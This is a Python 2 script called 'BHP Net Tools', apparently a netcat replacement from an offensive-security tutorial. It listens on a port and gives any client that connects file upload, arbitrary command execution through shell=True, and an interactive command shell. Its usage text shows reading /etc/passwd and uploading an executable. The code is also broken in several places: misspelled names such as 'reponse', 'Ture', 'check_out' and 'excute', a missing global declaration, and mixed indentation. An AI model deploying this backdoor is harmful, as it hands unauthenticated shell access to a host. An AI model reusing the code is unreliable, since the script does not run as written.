#!/usr/bin/env python

import os
import sys
import getopt
import threading
import subprocess
import socket

# define some global variables

listen			= False
command			= False
upload		        = False
execute			= ""
target			= ""
upload_destination 	= ""
port			= 0

def usage():
	print "BHP Net Tools"
	print
	print "Usage: bhpnet.py -t target_host -p port"
	print "-l --listen	                - listen on [host]:[port] for\
                                                  incoming connection"
	print "-e --execute=file_to_run	        - execute the given file upon\
                                                  receiving a connection"
	print "-c --command	                - innitialze a command shell"
	print "-u --upload=destination	        - upon receiving connection upload a\
                                                  file and write to [destination]"
	print
	print
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
	print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
	sys.exit(0)

def client_sender(buffer):
	
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	try:
		
                client.connect((target, port))
		
		if len(buffer):
			client.send(buffer)
			while True:
				
				# Now waiting for data back
				recv_len = 1
				response = ""
				
				while recv_len:
					data = client.recv(4096)
					recv_len += len(data)
					reponse += data
					
					if recv_len < 4096:
						break
						
				print response,
				
				# Wait for more input
				buffer = raw_input("")
				buffer += "\n"
				
				# Send it off
				client.send(buffer)
	except:
		
			print "[*] Exception! Exiting."
			client.close()
			

def server_loop():
	
		global target
		global port
		
		# if no target is defined, we listen on all interfaces
		if not len(target):
			target = "0.0.0.0"
			
		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server.bind ((target, port))
		
		server.listen(5)
		
		while True:
                        client_socket, addr = server.accept()
				
			# spin off a thread to handle our new client
			client_thread = threading.Thread(target=client_handler, args=(client_socket,))
			client_thread.start()
				
def run_command(command):
        # trim the newline
	command = command.rstrip()
			
	# run the command and get the output back
	try:
				
                output = subprocess.check_out(command, stderr=subprocess.STDOUT, shell=True)
	except:
		output = "Failed to execute command.\r\n"
					
	# send the output back to the client
        return output

def client_handler(client_socket):
	
	global upload
	global execute
	global command
		
	# Check for upload
	if len(upload_destination):
			
                # Read in all of the bytes and write to our destination
                file_buffer = ""
				
		# keep reading data until none is availabale
		while Ture:
                        data = client_socket.recv(1024)
						
			if not data:
				break
								
			else:
				file_buffer += data
								
			# now we take these bytes and try to write them out
		try:
			file_descriptor = open(upload_destination, "wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()
								
			# acknoledge that we wrote the file out
			client_socket.send("Successfully save file to %s\r\n" % upload_destination)
								
		except:
			client_socket.send("Failed to save file to %s\r\n" % upload_destination)
								
			# Check for command execute
	if len(execute):
					
		# Run the command
		output = run_command(execute)
						
		client_socket.send(output)
						
	# Now we go into another loop if a command shell was requested
	if command:
					
		while True:
                        # show a simple prompt
			client_socket.send("<BHP:#> ")
									
			#now we receive until we see a linefeed (enter key)
                        cmd_buffer = ""
			while "\n" not in cmd_buffer:
                                cmd_buffer += client_socket.recv(1024)
												
			# send back the command output
                        response = run_command(cmd_buffer)
										
			# send back the response
			client_socket.send(response)


	
def main():
	global listen
	global command
	global upload
	global excute
	global target
	global upload_destination
	global port
	
	if not len(sys.argv[1:]):
		usage()
		
	# Read the command
	try:
		opt, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu",
			["help","listen","excute","target","port","command","upload"])
	except getopt.GetoptError as err:
		print str(err)
		usage()
		
	for o,a in opt:
		if o in ("-h","--help"):
			usage()
		elif o in ("-l","--listen"):
			listen = True
		elif o in ("-e","--execute"):
			execute = a
		elif o in ("-t","--target"):
			target = a
		elif o in ("-p","--port"):
			port = int(a)
		elif o in ("-c","--command"):
			command = True
		elif o in ("-u","--upload"):
			upload_destination = a
		else:
			assert False,"Unhandled Option"
			
	# Are we going to listen or just send data from stdin?
	if not listen and len(target) and port > 0:
		
		# Read in the buffer from the commandline
		# This will block, so send CTRL-D if not sending input
		# to stdin
		
		buffer = sys.stdin.read()
		
		# Send data off
		client_sender(buffer)
		
	# We are going to listen and potentially
	# Upload thins, exceute command, and drop a shell back
	# Depending on our command line option above
	
	if listen:
		server_loop()
		
		
main()


	
